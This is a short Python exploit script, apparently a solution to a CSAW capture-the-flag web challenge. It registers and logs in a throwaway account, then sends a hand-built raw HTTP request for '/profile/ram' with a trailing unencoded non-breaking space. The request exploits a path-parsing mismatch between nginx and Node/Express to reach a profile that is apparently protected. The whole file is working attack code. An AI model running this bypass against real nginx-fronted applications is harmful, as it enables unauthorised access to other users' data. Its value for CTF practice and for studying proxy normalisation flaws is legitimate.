#!/usr/bin/env python3

import socket
import sys
from urllib.parse import urlparse, urljoin
import requests
import secrets

if len(sys.argv) < 2:
    URL = 'http://web.chal.csaw.io'
else:
    URL = sys.argv[1]

scheme = urlparse(URL).scheme
if scheme not in ['http', 'https']:
    print('Invalid URL')
    sys.exit(1)
parsed_url = urlparse(URL)
host = parsed_url.hostname
port = parsed_url.port
if port is None:
    port = 80 if scheme == 'http' else 443

print(f'URL: {URL}')
print(f'Host: {host}')
print(f'Port: {port}')

session = requests.Session()

# Generate a random username and password
username = f'user_{secrets.token_hex(4)}'
password = secrets.token_hex(8)

# Register
print(f"Registering user {username} with password {password}")
res = session.post(urljoin(URL, 'register'), data={'username': username, 'password': password})
res.raise_for_status()
print('Registered successfully')

# Log in
res = session.post(urljoin(URL, 'login'), data={'username': username, 'password': password})
res.raise_for_status()
print('Logged in successfully')

# Get /profile/ram\xA0 (non-ASCII character without URL encoding; nginx and Nodejs+express treat it differently)
print('Getting /profile/ram\xA0')
# Create an HTTP request with the non-ASCII character
# Get the cookie headers from the session
cookie = session.cookies.get_dict()
cookie_bytes = '; '.join([f'{k}={v}' for k, v in cookie.items()]).encode()
req = b"""GET /profile/ram\xA0 HTTP/1.1\r\nHost: %s:%d\r\nCookie: %s\r\n\r\n""" % (host.encode(), port, cookie_bytes)
# Send the request
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.sendall(req)
sock.settimeout(0.2)
# Receive the response
res = b''
while True:
    try:
        data = sock.recv(1024)
    except socket.timeout:
        break
    if not data:
        break
    res += data
    if b'\r\n\r\n' in res:
        break
sock.close()
# Print the response
print(res.decode())
